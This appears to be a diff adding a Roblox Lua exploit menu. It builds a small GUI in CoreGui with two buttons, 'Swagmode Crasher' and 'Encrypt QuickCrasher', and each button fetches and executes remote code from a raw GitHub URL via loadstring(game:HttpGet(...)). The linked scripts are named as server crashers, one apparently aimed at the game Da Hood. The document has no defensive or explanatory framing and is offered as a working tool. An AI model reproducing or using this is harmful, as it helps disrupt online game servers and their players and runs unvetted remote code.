@@ -1,0 +1,47 @@
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local script1 = Instance.new("TextButton")
+local script2 = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+main.BorderColor3 = Color3.fromRGB(93, 93, 93)
+main.Position = UDim2.new(0.0863157883, 0, 0.0735586509, 0)
+main.Size = UDim2.new(0, 223, 0, 156)
+main.Active = true
+main.Draggable = true
+
+script1.Name = "script1"
+script1.Parent = ScreenGui
+script1.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+script1.BorderColor3 = Color3.fromRGB(30, 30, 30)
+script1.Position = UDim2.new(0.138947368, 0, 0.0934393629, 0)
+script1.Size = UDim2.new(0, 172, 0, 48)
+script1.Font = Enum.Font.SourceSans
+script1.Text = "Swagmode Crasher"
+script1.TextColor3 = Color3.fromRGB(255, 255, 255)
+script1.TextSize = 14.000
+script1.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+script2.Name = "script2"
+script2.Parent = ScreenGui
+script2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+script2.BorderColor3 = Color3.fromRGB(85, 85, 85)
+script2.Position = UDim2.new(0.138947368, 0, 0.260437369, 0)
+script2.Size = UDim2.new(0, 172, 0, 37)
+script2.Font = Enum.Font.SourceSans
+script2.Text = "Encrypt QuickCrasher"
+script2.TextColor3 = Color3.fromRGB(255, 255, 255)
+script2.TextSize = 14.000
+script2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
+end)
